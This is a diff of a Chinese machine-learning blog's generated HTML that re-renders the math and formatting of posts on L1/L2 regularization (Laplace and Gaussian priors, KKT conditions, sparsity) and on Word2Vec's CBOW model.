@@ -159,7 +159,7 @@
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">61</span>
+        <span class="site-state-item-count">57</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
@@ -268,14 +268,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>4k</span>
+      <span>4.1k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>7 分钟</span>
+      <span>8 分钟</span>
     </span>
 </div>
 
@@ -286,7 +286,8 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h3><span id="一-正则化-l1和l2"><strong><font color="red">一、正则化 L1和L2</font></strong></span></h3>
+          <h3><span id="一-正则化l1和l2"><strong><font color="red">一、正则化
+L1和L2</font></strong></span></h3>
 <blockquote>
 <ul>
 <li><strong>本质其实是为了模型参数服从某一分布</strong>；</li>
@@ -295,106 +296,178 @@
 <p><strong>为什么希望参数具有稀疏性？</strong></p>
 <p>相当于对模型进行了一次特征选择，只留下比较重要的特征，提高模型的泛化能力；</p>
 </blockquote>
-<p>**<font color="red"> 正则化是一个通用的算法和思想，所以会产生过拟合现象的算法都可以使用正则化来避免过拟合。在经验风险最小化的基础上（也就是训练误差最小化），尽可能采用简单的模型，可以有效提高泛化预测精度。</font>**如果模型过于复杂，变量值稍微有点变动，就会引起预测精度问题。正则化之所以有效，就是因为其降低了特征的权重，使得模型更为简单。</p>
-<p>正则化一般会采用 L1 范式或者 L2 范式, 其形式分别为 $\Phi(w)=|x|_1$ 和 $\Phi(w)=|x|_2 。$</p>
-<img src="https://pic3.zhimg.com/80/v2-a352bc374e80df1299a4d63d39ce4606_1440w.jpg" alt="img" style="zoom:50%;">
-<h4><span id="11-l1-正则化-零均值拉普拉斯分布">1.1 <strong>L1 正则化</strong> 【零均值拉普拉斯分布】</span></h4>
-<p><strong>LASSO 回归, 相当于为模型添加了这样一个先验知识</strong>： $\mathbf{w}$ 服从<strong>零均值拉普拉斯分布</strong>。首先看看拉普拉斯分布长什 么样子:<br>
-$$<br>
-f(w \mid \mu, b)=\frac{1}{2 b} \exp \left(-\frac{|w-\mu|}{b}\right)<br>
-$$<br>
-由于引入了先验知识, 所以似然函数这样写:<br>
-$$<br>
-\begin{aligned}<br>
-L(w) &amp; =P(y \mid w, x) P(w) \<br>
-&amp; =\prod_{i=1}^N p\left(x_i\right)<sup>{y_i}\left(1-p\left(x_i\right)\right)</sup>{1-y_i} \prod_{j=1}^d \frac{1}{2 b} \exp \left(-\frac{\left|w_j\right|}{b}\right)<br>
-\end{aligned}<br>
-$$<br>
-取 $\log$ 再取负，得到目标函数:<br>
-$$<br>
--\ln L(w)=-\sum_i\left[y_i \ln p\left(x_i\right)+\left(1-y_i\right) \ln \left(1-p\left(x_i\right)\right)\right]+\frac{1}{2 b^2} \sum_j\left|w_j\right|<br>
-$$<br>
-等价于原始损失函数的后面加上了 L1 正则, 因此 L1 正则的本质其实是为模型增加了“模型参数服从零均值拉普拉 斯分布&quot;这一先验知识。</p>
-<h4><span id="12-l2-正则化零均值正态分布"><strong>1.2 L2 正则化</strong>【零均值正态分布】</span></h4>
-<p>Ridge 回归, 相当于为模型添加了这样一个先验知识： $w$ 服从<strong>零均值正态分布</strong>。<br>
-首先看看正态分布长什么样子:<br>
-$$<br>
-f(w \mid \mu, \sigma)=\frac{1}{\sqrt{2 \pi} \sigma} \exp \left(-\frac{(w-\mu)^2}{2 \sigma^2}\right)<br>
-$$<br>
-由于引入了先验知识, 所以似然函数这样写:<br>
-$$<br>
-\begin{aligned}<br>
-L(w) &amp; =P(y \mid w, x) P(w) \<br>
-&amp; =\prod_{i=1}^N p\left(x_i\right)<sup>{y_i}\left(1-p\left(x_i\right)\right)</sup>{1-y_i} \prod_{j=1}^d \frac{1}{\sqrt{2 \pi} \sigma} \exp \left(-\frac{w_j^2}{2 \sigma^2}\right) \<br>
-&amp; =\prod_{i=1}^N p\left(x_i\right)<sup>{y_i}\left(1-p\left(x_i\right)\right)</sup>{1-y_i} \frac{1}{\sqrt{2 \pi} \sigma} \exp \left(-\frac{w^T w}{2 \sigma^2}\right)<br>
-\end{aligned}<br>
-$$<br>
-取 In 再取负，得到目标函数:<br>
-$$<br>
--\ln L(w)=-\sum_i\left[y_i \ln p\left(x_i\right)+\left(1-y_i\right) \ln \left(1-p\left(x_i\right)\right)\right]+\frac{1}{2 \sigma^2} w^T w<br>
-$$<br>
-等价于原始的损失函数后面加上了 $L 2$ 正则, 因此 $L 2$ 正则的本质其实是为模型增加了““<strong>模型参数服从零均值正态分 布</strong>&quot;这一先验知识。</p>
+<p><strong><font color="red">
+正则化是一个通用的算法和思想，所以会产生过拟合现象的算法都可以使用正则化来避免过拟合。在经验风险最小化的基础上（也就是训练误差最小化），尽可能采用简单的模型，可以有效提高泛化预测精度。</font></strong>如果模型过于复杂，变量值稍微有点变动，就会引起预测精度问题。正则化之所以有效，就是因为其降低了特征的权重，使得模型更为简单。</p>
+<p>正则化一般会采用 L1 范式或者 L2 范式, 其形式分别为 <span class="math inline">\(\Phi(w)=\|x\|_1\)</span> 和 <span class="math inline">\(\Phi(w)=\|x\|_2 。\)</span></p>
+<p><img src="https://pic3.zhimg.com/80/v2-a352bc374e80df1299a4d63d39ce4606_1440w.jpg" alt="img" style="zoom:50%;"></p>
+<h4><span id="11-l1-正则化零均值拉普拉斯分布">1.1 <strong>L1 正则化</strong>
+【零均值拉普拉斯分布】</span></h4>
+<p><strong>LASSO 回归, 相当于为模型添加了这样一个先验知识</strong>：
+<span class="math inline">\(\mathbf{w}\)</span>
+服从<strong>零均值拉普拉斯分布</strong>。首先看看拉普拉斯分布长什
+么样子: <span class="math display">\[
+f(w \mid \mu, b)=\frac{1}{2 b} \exp \left(-\frac{|w-\mu|}{b}\right)
+\]</span> 由于引入了先验知识, 所以似然函数这样写: <span class="math display">\[
+\begin{aligned}
+L(w) &amp; =P(y \mid w, x) P(w) \\
+&amp; =\prod_{i=1}^N
+p\left(x_i\right)^{y_i}\left(1-p\left(x_i\right)\right)^{1-y_i}
+\prod_{j=1}^d \frac{1}{2 b} \exp
+\left(-\frac{\left|w_j\right|}{b}\right)
+\end{aligned}
+\]</span> 取 <span class="math inline">\(\log\)</span>
+再取负，得到目标函数: <span class="math display">\[
+-\ln L(w)=-\sum_i\left[y_i \ln p\left(x_i\right)+\left(1-y_i\right) \ln
+\left(1-p\left(x_i\right)\right)\right]+\frac{1}{2 b^2}
+\sum_j\left|w_j\right|
+\]</span> 等价于原始损失函数的后面加上了 L1 正则, 因此 L1
+正则的本质其实是为模型增加了“模型参数服从零均值拉普拉
+斯分布"这一先验知识。</p>
+<h4><span id="12-l2正则化零均值正态分布"><strong>1.2 L2
+正则化</strong>【零均值正态分布】</span></h4>
+<p>Ridge 回归, 相当于为模型添加了这样一个先验知识： <span class="math inline">\(w\)</span> 服从<strong>零均值正态分布</strong>。
+首先看看正态分布长什么样子: <span class="math display">\[
+f(w \mid \mu, \sigma)=\frac{1}{\sqrt{2 \pi} \sigma} \exp
+\left(-\frac{(w-\mu)^2}{2 \sigma^2}\right)
+\]</span> 由于引入了先验知识, 所以似然函数这样写: <span class="math display">\[
+\begin{aligned}
+L(w) &amp; =P(y \mid w, x) P(w) \\
+&amp; =\prod_{i=1}^N
+p\left(x_i\right)^{y_i}\left(1-p\left(x_i\right)\right)^{1-y_i}
+\prod_{j=1}^d \frac{1}{\sqrt{2 \pi} \sigma} \exp \left(-\frac{w_j^2}{2
+\sigma^2}\right) \\
+&amp; =\prod_{i=1}^N
+p\left(x_i\right)^{y_i}\left(1-p\left(x_i\right)\right)^{1-y_i}
+\frac{1}{\sqrt{2 \pi} \sigma} \exp \left(-\frac{w^T w}{2
+\sigma^2}\right)
+\end{aligned}
+\]</span> 取 In 再取负，得到目标函数: <span class="math display">\[
+-\ln L(w)=-\sum_i\left[y_i \ln p\left(x_i\right)+\left(1-y_i\right) \ln
+\left(1-p\left(x_i\right)\right)\right]+\frac{1}{2 \sigma^2} w^T w
+\]</span> 等价于原始的损失函数后面加上了 <span class="math inline">\(L
+2\)</span> 正则, 因此 <span class="math inline">\(L 2\)</span>
+正则的本质其实是为模型增加了““<strong>模型参数服从零均值正态分
+布</strong>"这一先验知识。</p>
 <h4><span id="13-l1-和-l2-的区别">1.3 L1 和 L2 的区别</span></h4>
 <blockquote>
 <ul>
-<li><strong><font color="red"> 解空间约束条件 ： KKT条件【互斥松弛条件 + 约束条件大于0】</font></strong></li>
-<li><strong><font color="red"> 函数叠加：（0点成为最值的可能）导数为0的可能性</font></strong></li>
+<li><strong><font color="red"> 解空间约束条件 ： KKT条件【互斥松弛条件 +
+约束条件大于0】</font></strong></li>
+<li><strong><font color="red">
+函数叠加：（0点成为最值的可能）导数为0的可能性</font></strong></li>
 <li><strong><font color="red"> 贝叶斯先验：分布图像</font></strong></li>
 </ul>
 </blockquote>
-<p><strong>L1 正则化</strong>增加了所有权重 w 参数的绝对值之和<strong>逼迫更多 w 为零</strong>，也就是变稀疏（ L2 因为其导数也趋 0, 奔向零的速度不如 L1 给力了）。对<strong>稀疏规则趋之若鹜</strong>的一个关键原因在于它能<strong>实现特征的自动选择</strong>。L1 正则化的引入就是为了完成特征自动选择的光荣使命，它会学习地去掉这些无用的特征，也就是把这些特征对应的权重置为 0。</p>
-<p><strong>L2 正则化</strong>中增加所有权重 w 参数的平方之和，逼迫所有 <strong>w 尽可能趋向零但不为零</strong>（L2 的导数趋于零）。因为在未加入 L2 正则化发生过拟合时，拟合函数需要顾忌每一个点，最终形成的拟合函数波动很大，在某些很小的区间里，函数值的变化很剧烈，也就是某些 w 值非常大。为此，L2 正则化的加入就惩罚了权重变大的趋势。</p>
-<h4><span id="14-l1正则化使得模型参数具有稀疏性的原理"><strong><font color="red"> 1.4 L1正则化使得模型参数具有稀疏性的原理？</font></strong></span></h4>
-<h5><span id="1-解空间约束条件-kkt条件互斥松弛条件-约束条件大于0">(1) 解空间约束条件 ： KKT条件【互斥松弛条件 + 约束条件大于0】</span></h5>
-<p><strong>KKT 条件是指优化问题在最优处（包括基本型的最优值，对偶问题的最优值）必须满足的条件</strong>。</p>
+<p><strong>L1 正则化</strong>增加了所有权重 w
+参数的绝对值之和<strong>逼迫更多 w 为零</strong>，也就是变稀疏（ L2
+因为其导数也趋 0, 奔向零的速度不如 L1
+给力了）。对<strong>稀疏规则趋之若鹜</strong>的一个关键原因在于它能<strong>实现特征的自动选择</strong>。L1
+正则化的引入就是为了完成特征自动选择的光荣使命，它会学习地去掉这些无用的特征，也就是把这些特征对应的权重置为
+0。</p>
+<p><strong>L2 正则化</strong>中增加所有权重 w 参数的平方之和，逼迫所有
+<strong>w 尽可能趋向零但不为零</strong>（L2 的导数趋于零）。因为在未加入
+L2
+正则化发生过拟合时，拟合函数需要顾忌每一个点，最终形成的拟合函数波动很大，在某些很小的区间里，函数值的变化很剧烈，也就是某些
+w 值非常大。为此，L2 正则化的加入就惩罚了权重变大的趋势。</p>
+<h4><span id="14l1正则化使得模型参数具有稀疏性的原理"><strong><font color="red"> 1.4
+L1正则化使得模型参数具有稀疏性的原理？</font></strong></span></h4>
+<h5><span id="1解空间约束条件-kkt条件互斥松弛条件-约束条件大于0">(1)
+解空间约束条件 ： KKT条件【互斥松弛条件 + 约束条件大于0】</span></h5>
+<p><strong>KKT
+条件是指优化问题在最优处（包括基本型的最优值，对偶问题的最优值）必须满足的条件</strong>。</p>
 <blockquote>
 <p><strong>参考线性支持向量机的 KKT 条件:</strong></p>
 <ul>
-<li><strong>主问题可行</strong>: $g_{i}\left(u<sup>{\star}\right)=1-y_{i}\left(w</sup>{\star \top} x_{i}+b^{\star}\right) \leq 0$ ；</li>
-<li><strong><font color="red"> 对偶问题可行: $\alpha_{i}^{\star} \geq 0$</font></strong>;</li>
-<li><strong>主变量最优</strong>: $w<sup>{\star}=\sum_{i=1}</sup>{m} \alpha_{i} y_{i} x_{i}, \sum_{i=1}^{m} \alpha_{i} y_{i}=0$;</li>
-<li><strong><font color="red"> 互补松弛: $\alpha_{i}^{\star} g_{i}\left(u<sup>{\star}\right)=\alpha_{i}</sup>{\star}\left(1-y_{i}\left(w^{\star \top} x_{i}+b^{\star}\right)\right)=0$ ；</font></strong></li>
+<li><strong>主问题可行</strong>: <span class="math inline">\(g_{i}\left(u^{\star}\right)=1-y_{i}\left(w^{\star
+\top} x_{i}+b^{\star}\right) \leq 0\)</span> ；</li>
+<li><strong><font color="red"> 对偶问题可行: <span class="math inline">\(\alpha_{i}^{\star} \geq
+0\)</span></font></strong>;</li>
+<li><strong>主变量最优</strong>: <span class="math inline">\(w^{\star}=\sum_{i=1}^{m} \alpha_{i} y_{i} x_{i},
+\sum_{i=1}^{m} \alpha_{i} y_{i}=0\)</span>;</li>
+<li><strong><font color="red"> 互补松弛: <span class="math inline">\(\alpha_{i}^{\star}
+g_{i}\left(u^{\star}\right)=\alpha_{i}^{\star}\left(1-y_{i}\left(w^{\star
+\top} x_{i}+b^{\star}\right)\right)=0\)</span> ；</font></strong></li>
 </ul>
 </blockquote>
-<p><strong>原函数曲线等高线（同颜色曲线上，每一组$w_1,w_2$带入后值都相同)</strong>：</p>
-<img src="https://pic4.zhimg.com/80/v2-efc752bd6d1ce09dbf2e18b9766570eb_1440w.jpg" alt="img" style="zoom:50%;">
-<p>当加入 L1 正则化的时候, 我们先画出 $\left|w_1\right|+\left|w_2\right|=F$ 的图像, 也就是一个菱形, 代表这些曲线上的点算出来的 要使得这个菱形越小越好 ( $F$ 越小越好)。那么还和原来一样的话, 过中心紫色圈圈的那个菱形明显很大, 因此我 们要取到一个恰好的值。那么如何求值呢?</p>
-<ol>
-<li>以同一条原曲线目标等高线来说, 现在以最外圈的红色等高线为例, 我们看到, 对于红色曲线上的每个点都可 做一个菱形, 根据上图可知, 当这个菱形与某条等高线相切（仅有一个交点）的时候, 这个菱形最小, 上图相 割对比较大的两个菱形对应的 L1 范数更大。用公式说这个时候能使得在相同的 $\frac{1}{N} \sum_{i=1}<sup>N\left(y_i-w</sup>T x_i\right)^2$, 由于 相切的时候的 $C|| w |_1$ 小, 即 $\left|w_1\right|+\left|w_2\right|$ 所以能够使得 $\frac{1}{N} \sum i=1<sup>N\left(y_i-w</sup>T x_i\right)^2+C|| w |_1$ 更小;</li>
-<li>有了第一条的说明我们可以看出, 最终加入 $L 1$ 范数得到的解一定是某个菱形和某条原函数等高线的切点。现 在有个比较重要的结论来了, <font color="red"> 我们经过观察可以看到, 几乎对于很多原函数等高曲线, 和某个菱形相交的时 候及其容易相交在坐标轴 (比如上图) , 也就是说最终的结果, 解的某些维度及其容易是 0, 比如上图最终解 是 $w=(0, x)$ ，这也就是我们所说的 L1 更容易得到稀疏解（解向量中 0 比较多)的原因;</font></li>
-<li>当加入 $L 2$ 正则化的时候, 分析和 $L 1$ 正则化是类似的, 也就是说我们仅仅是从菱形变成了圆形而已, 同样还 是求原曲线和圆形的切点作为最终解。<strong>当然与 $L 1$ 范数比, 我们这样求的 $L 2$ 范数的从图上来看, 不容易交在 坐标轴上, 但是仍然比较靠近坐标轴。因此这也就是我们老说的, L2 范数能让解比较小 (靠近 0), 但是比 较平滑（不等于 0)。</strong></li>
+<p><strong>原函数曲线等高线（同颜色曲线上，每一组<span class="math inline">\(w_1,w_2\)</span>带入后值都相同)</strong>：</p>
+<p><img src="https://pic4.zhimg.com/80/v2-efc752bd6d1ce09dbf2e18b9766570eb_1440w.jpg" alt="img" style="zoom:50%;"></p>
+<p>当加入 L1 正则化的时候, 我们先画出 <span class="math inline">\(\left|w_1\right|+\left|w_2\right|=F\)</span>
+的图像, 也就是一个菱形, 代表这些曲线上的点算出来的
+要使得这个菱形越小越好 ( <span class="math inline">\(F\)</span>
+越小越好)。那么还和原来一样的话, 过中心紫色圈圈的那个菱形明显很大,
+因此我 们要取到一个恰好的值。那么如何求值呢?</p>
+<ol type="1">
+<li>以同一条原曲线目标等高线来说, 现在以最外圈的红色等高线为例,
+我们看到, 对于红色曲线上的每个点都可 做一个菱形, 根据上图可知,
+当这个菱形与某条等高线相切（仅有一个交点）的时候, 这个菱形最小, 上图相
+割对比较大的两个菱形对应的 L1 范数更大。用公式说这个时候能使得在相同的
+<span class="math inline">\(\frac{1}{N} \sum_{i=1}^N\left(y_i-w^T
+x_i\right)^2\)</span>, 由于 相切的时候的 <span class="math inline">\(C||
+w \|_1\)</span> 小, 即 <span class="math inline">\(\left|w_1\right|+\left|w_2\right|\)</span>
+所以能够使得 <span class="math inline">\(\frac{1}{N} \sum
+i=1^N\left(y_i-w^T x_i\right)^2+C|| w \|_1\)</span> 更小;</li>
+<li>有了第一条的说明我们可以看出, 最终加入 <span class="math inline">\(L
+1\)</span> 范数得到的解一定是某个菱形和某条原函数等高线的切点。现
+在有个比较重要的结论来了, <font color="red"> 我们经过观察可以看到,
+几乎对于很多原函数等高曲线, 和某个菱形相交的时 候及其容易相交在坐标轴
+(比如上图) , 也就是说最终的结果, 解的某些维度及其容易是 0,
+比如上图最终解 是 <span class="math inline">\(w=(0, x)\)</span>
+，这也就是我们所说的 L1 更容易得到稀疏解（解向量中 0
+比较多)的原因;</font></li>
+<li>当加入 <span class="math inline">\(L 2\)</span> 正则化的时候, 分析和
+<span class="math inline">\(L 1\)</span> 正则化是类似的,
+也就是说我们仅仅是从菱形变成了圆形而已, 同样还
+是求原曲线和圆形的切点作为最终解。<strong>当然与 <span class="math inline">\(L 1\)</span> 范数比, 我们这样求的 <span class="math inline">\(L 2\)</span> 范数的从图上来看, 不容易交在
+坐标轴上, 但是仍然比较靠近坐标轴。因此这也就是我们老说的, L2
+范数能让解比较小 (靠近 0), 但是比 较平滑（不等于 0)。</strong></li>
 </ol>
-<h5><span id="2-函数叠加0点成为最值的可能导数为0的可能性">(2) 函数叠加：（0点成为最值的可能)导数为0的可能性</span></h5>
-<p>我们接下来从更严谨的方式来证明, 简而言之就是假设现在我们是一维的情况下 $h(w)=f(w)+C|w|$, 其中 $h(w)$ 是目标函数, $f(w)$ 是没加 $\mathrm{L} 1$ 正则化项前的目标函数, $C|w|$ 是 $\mathrm{L}$ 正则项, 要使得 0 点成为最值可能的点, <strong>虽然在 0 点不可导, 但是我们只需要让 0 点左右的导数异号, 即 $h_l^{\prime}(0) h_r<sup>{\prime}(0)=\left(f</sup>{\prime}(0)+C\right)\left(f^{\prime}(0)-C\right)&lt;0$ 即可也就 是 $C&gt;\left|f^{\prime}(0)\right|$ 的情况下, 0 点都是可能的最值点</strong>。相反, L2正则项在原点处的导数是0, 只要原目标函数在原点 处导数不为 0 , 那么最小值点就不会在原点, 所以 $L 2$ 只有减小w最对值的作用, 对解空间的稀疏性没有贡献。</p>
+<h5><span id="2函数叠加0点成为最值的可能导数为0的可能性">(2)
+函数叠加：（0点成为最值的可能)导数为0的可能性</span></h5>
+<p>我们接下来从更严谨的方式来证明,
+简而言之就是假设现在我们是一维的情况下 <span class="math inline">\(h(w)=f(w)+C|w|\)</span>, 其中 <span class="math inline">\(h(w)\)</span> 是目标函数, <span class="math inline">\(f(w)\)</span> 是没加 <span class="math inline">\(\mathrm{L} 1\)</span> 正则化项前的目标函数, <span class="math inline">\(C|w|\)</span> 是 <span class="math inline">\(\mathrm{L}\)</span> 正则项, 要使得 0
+点成为最值可能的点, <strong>虽然在 0 点不可导, 但是我们只需要让 0
+点左右的导数异号, 即 <span class="math inline">\(h_l^{\prime}(0)
+h_r^{\prime}(0)=\left(f^{\prime}(0)+C\right)\left(f^{\prime}(0)-C\right)&lt;0\)</span>
+即可也就 是 <span class="math inline">\(C&gt;\left|f^{\prime}(0)\right|\)</span> 的情况下,
+0 点都是可能的最值点</strong>。相反, L2正则项在原点处的导数是0,
+只要原目标函数在原点 处导数不为 0 , 那么最小值点就不会在原点, 所以 <span class="math inline">\(L 2\)</span> 只有减小w最对值的作用,
+对解空间的稀疏性没有贡献。</p>
 <h5><span id="3-贝叶斯先验分布图像">(3) 贝叶斯先验：分布图像</span></h5>
-<img src="https://pic3.zhimg.com/80/v2-a352bc374e80df1299a4d63d39ce4606_1440w.jpg" alt="img" style="zoom:50%;">
+<p><img src="https://pic3.zhimg.com/80/v2-a352bc374e80df1299a4d63d39ce4606_1440w.jpg" alt="img" style="zoom:50%;"></p>
 <p><strong>从贝叶斯加入先验分布的角度解释，L1正则化相当于对模型参数引入拉普拉斯先验，L2正则化相当于与引入了高斯先验。高斯分布在0点是平滑的，拉普拉斯在0点处是一个尖峰。</strong></p>
 <h4><span id="15-简单总结">1.5 <strong>简单总结</strong></span></h4>
 <table>
+<colgroup>
+<col style="width: 12%">
+<col style="width: 59%">
+<col style="width: 27%">
+</colgroup>
 <thead>
-<tr>
+<tr class="header">
 <th>正则化</th>
 <th>L1 正则化</th>
 <th>L2 正则化</th>
 </tr>
 </thead>
 <tbody>
-<tr>
+<tr class="odd">
 <td>服从分布</td>
 <td>零均值拉普拉斯分布</td>
 <td>零均值正态分布</td>
 </tr>
-<tr>
+<tr class="even">
 <td>损失函数变化</td>
-<td>$\frac{1}{2 b^2} \sum_j\left</td>
-<td>w_j\right</td>
+<td><span class="math inline">\(\frac{1}{2 b^2} \sum_j\left
+|w_j\right|\)</span></td>
+<td><span class="math inline">\(\frac{1}{2 \sigma^2} w^T w\)</span></td>
 </tr>
-<tr>
+<tr class="odd">
 <td>模型参数w效果</td>
-<td>逼迫更多 w 为零，【稀疏解】<strong><font color="red"> （解空间约束条件、函数叠加、贝叶斯先验）</font></strong></td>
+<td>逼迫更多 w 为零，【稀疏解】<strong><font color="red">
+（解空间约束条件、函数叠加、贝叶斯先验）</font></strong></td>
 <td>趋向零但不为零【平滑】</td>
 </tr>
-<tr>
+<tr class="even">
 <td>作用</td>
 <td>【特征选择】【降低模型复杂度】</td>
 <td>【降低模型复杂度】</td>
@@ -490,7 +563,7 @@ $$<br>
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>7.8k</span>
+      <span>7.9k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -511,33 +584,23 @@ $$<br>
           <h2><span id="一-word2vec">一、Word2Vec</span></h2>
 <blockquote>
 <ul>
-<li>
-<p><strong>nlp中的词向量对比：word2vec/glove/fastText/elmo/GPT/bert</strong>：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/56382372">https://zhuanlan.zhihu.com/p/56382372</a></p>
-</li>
-<li>
-<p>Word2Vec算法梳理🔥 - 杨航锋的文章 - 知乎 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/58290018">https://zhuanlan.zhihu.com/p/58290018</a></p>
-</li>
-<li>
-<p><a target="_blank" rel="noopener" href="https://plushunter.github.io/2018/02/14/%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86%E7%B3%BB%E5%88%97%EF%BC%882%EF%BC%89%EF%BC%9AWord2Vec/">Free will：Word2Vec</a></p>
-</li>
-<li>
-<p>[<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/26306795">NLP] 秒懂词向量<em>Word2vec</em>的本质</a></p>
-</li>
-<li>
-<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/61635013"><em>Word2Vec</em>详解</a></p>
-</li>
-<li>
-<p><strong><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/53425736"><em>word2vec</em>详解（CBOW，skip-gram，负采样，分层Softmax）</a></strong></p>
-</li>
-<li>
-<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/89637281">快速入门词嵌入之<em>word2vec</em></a></p>
-</li>
+<li><p><strong>nlp中的词向量对比：word2vec/glove/fastText/elmo/GPT/bert</strong>：https://zhuanlan.zhihu.com/p/56382372</p></li>
+<li><p>Word2Vec算法梳理🔥 - 杨航锋的文章 - 知乎
+https://zhuanlan.zhihu.com/p/58290018</p></li>
+<li><p><a target="_blank" rel="noopener" href="https://plushunter.github.io/2018/02/14/%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86%E7%B3%BB%E5%88%97%EF%BC%882%EF%BC%89%EF%BC%9AWord2Vec/">Free
+will：Word2Vec</a></p></li>
+<li><p>[<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/26306795">NLP]
+秒懂词向量<em>Word2vec</em>的本质</a></p></li>
+<li><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/61635013"><em>Word2Vec</em>详解</a></p></li>
+<li><p><strong><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/53425736"><em>word2vec</em>详解（CBOW，skip-gram，负采样，分层Softmax）</a></strong></p></li>
+<li><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/89637281">快速入门词嵌入之<em>word2vec</em></a></p></li>
 </ul>
-<p><strong>word2vec 相比之前的 Word Embedding 方法好在什么地方？</strong></p>
+<p><strong>word2vec 相比之前的 Word Embedding
+方法好在什么地方？</strong></p>
 <ul>
 <li><strong>极快的训练速度</strong>。以前的语言模型优化的目标是MLE，只能说词向量是其副产品。Mikolov应该是第一个提出抛弃MLE（和困惑度）指标，就是要学习一个好的词嵌入。如果不追求MLE，模型就可以大幅简化，去除隐藏层。再利用HSoftmax以及负采样的加速方法，可以使得训练在小时级别完成。而原来的语言模型可能需要几周时间。</li>
 <li><strong>一个很酷炫的man-woman=king-queen的示例</strong>。这个示例使得人们发现词嵌入还可以这么玩，并促使词嵌入学习成为了一个研究方向，而不再仅仅是神经网络中的一些参数。</li>
-<li>**word2vec里有大量的tricks，比如噪声分布如何选？如何采样？如何负采样？**等等。这些tricks虽然摆不上台面，但是对于得到一个好的词向量至关重要。</li>
+<li><strong>word2vec里有大量的tricks，比如噪声分布如何选？如何采样？如何负采样？</strong>等等。这些tricks虽然摆不上台面，但是对于得到一个好的词向量至关重要。</li>
 </ul>
 </blockquote>
 <p>谷歌2013年提出的Word2Vec是目前最常用的词嵌入模型之一。Word2Vec实际是一种<strong>浅层的神经网络模型</strong>，它有两种网络结构，分别是<strong>连续词袋</strong>（CBOW）和<strong>跳字</strong>(Skip-Gram)模型。</p>
@@ -545,186 +608,271 @@ $$<br>
 <p>CBOW适合于数据集较小的情况，而Skip-Gram在大型语料中表现更好</p>
 </blockquote>
 <h3><span id="11-介绍cbow">1.1 介绍CBOW</span></h3>
-<p>CBOW，全称Continuous Bag-of-Word，中文叫做连续词袋模型：<strong>以上下文来预测当前词</strong> $w_t$ 。CBOW模型的目的是预测 $P(w_t| w_{t-k}, \cdots, w_{t-1}, w_{t+1}, \cdots, w_{t+k}) $</p>
-<p><img src="https://pic4.zhimg.com/v2-27f3e577618f84c0026968d273d823ef_b.jpg" alt="img"></p>
+<p>CBOW，全称Continuous
+Bag-of-Word，中文叫做连续词袋模型：<strong>以上下文来预测当前词</strong>
+<span class="math inline">\(w_t\)</span> 。CBOW模型的目的是预测 $P(w_t|
+w_{t-k}, , w_{t-1}, w_{t+1}, , w_{t+k}) $</p>
+<figure>
+<img src="https://pic4.zhimg.com/v2-27f3e577618f84c0026968d273d823ef_b.jpg" alt="img">
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <h4><span id="前向传播过程">前向传播过程</span></h4>
 <ul>
-<li>
-<p><strong>输入层</strong>: 输入C个单词$x$： $x_{1k}, \cdots, x_{Ck} $，并且每个 $x$ 都是用 <strong>One-hot</strong> 编码表示，每一个 $x$ 的维度为 V（词表长度）。</p>
-</li>
-<li>
-<p><strong>输入层到隐层</strong></p>
+<li><p><strong>输入层</strong>: 输入C个单词<span class="math inline">\(x\)</span>： $x_{1k}, , x_{Ck} $，并且每个 <span class="math inline">\(x\)</span> 都是用 <strong>One-hot</strong>
+编码表示，每一个 <span class="math inline">\(x\)</span> 的维度为
+V（词表长度）。</p></li>
+<li><p><strong>输入层到隐层</strong></p>
 <ul>
-<li>首先，共享矩阵为 $W_{V \times N}$ ，<strong>V表示词表长度</strong>，W的每一行表示的就是一个N维的向量（训练结束后，W的每一行就表示一个词的词向量）。</li>
-<li>然后，我们把所有<strong>输入的词转$x$化为对应词向量</strong>，然后<strong>取平均值</strong>，这样我们就得到了隐层输出值 ( 注意，隐层中无激活函数，也就是说这里是线性组合)。 其中，隐层输出 $h$ 是一个N维的向量 。</li>
+<li>首先，共享矩阵为 <span class="math inline">\(W_{V \times N}\)</span>
+，<strong>V表示词表长度</strong>，W的每一行表示的就是一个N维的向量（训练结束后，W的每一行就表示一个词的词向量）。</li>
+<li>然后，我们把所有<strong>输入的词转<span class="math inline">\(x\)</span>化为对应词向量</strong>，然后<strong>取平均值</strong>，这样我们就得到了隐层输出值
+( 注意，隐层中无激活函数，也就是说这里是线性组合)。 其中，隐层输出 <span class="math inline">\(h\)</span> 是一个N维的向量 。</li>
 </ul>
-<p>$$<br>
-h = \frac{1}{C} W^T(x_1 + x_2 + \cdots + x_c)<br>
-$$</p>
-</li>
-<li>
-<p><strong>隐层到输出层</strong>：隐层的输出为N维向量 $h$ ， 隐层到输出层的权重矩阵为  $W’_{N \times V}$ 。然后，通过矩阵运算我们得到一个 $V \times 1 $ 维向量<br>
-$$<br>
-u = W’^{T} * h<br>
-$$</p>
-</li>
+<p><span class="math display">\[
+  h = \frac{1}{C} W^T(x_1 + x_2 + \cdots + x_c)
+  \]</span></p></li>
